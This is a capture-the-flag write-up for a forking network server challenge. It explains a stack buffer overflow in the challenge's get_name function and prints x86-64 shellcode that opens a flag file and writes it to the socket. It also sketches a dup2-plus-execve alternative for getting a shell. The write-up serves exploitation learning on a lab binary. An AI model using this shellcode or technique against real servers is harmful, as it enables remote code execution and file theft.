# server

This challenge is very similar to the [Only Read Write](../onlyreadwrite/README.md) challenge. The only difference is that the binary now is a server that listens on a port and forks a child process that reads in a buffer. Then we have to write not on stdout but on the socket file descriptor.

```c
    mov r12, rdi
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f2e
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
    /* call read(fd_open, 'rsp', 0x64) */
    push rax
    xor eax, eax /* SYS_read */
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    syscall
    /* write(fd_socket, buf='rsp', n=0x64) */
    push r12
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
```

In this case I used R12 to store the socket file descriptor. The shellcode is the same as the previous challenge, except for the write part were we put R12 in RDI, and then we call write.

The process forked from the server executes this function

```c
void prog(int socket_fd) {
  size_t n;
  char name [1008];

  get_name(socket_fd, name);
  write(socket_fd, "Hello Mr.", 9);
  n = strlen(name);
  write(socket_fd, name, n);
  return;
}
```

get_name() is reading 4096 bytes in a buffer of 1008 bytes, so we have a buffer overflow. We overflow the buffer with the shellcode and modify the return address to point to it. We know the address of the shellcode because it is in the .bss section and the binary is not PIE.

## Alternative solution

One can also use the syscall `dup2` to redirect the socket file descriptor to stdout, and then use the shellcode from the previous challenges.

```c
xor rax, rax
mov rax, 0x21 /* dup2 */
mov rsi, 0x0
/* mov rdi, rdi <- the fd is already in rdi */
syscall
```

Then do the same for stdin. And then just a normal execve will do the job.

Note that I'm not overwriting the rdi register (that should contain the `newfd` argument) because the file descriptor is already in rdi.

The complete exploit is in [script.py](script.py).
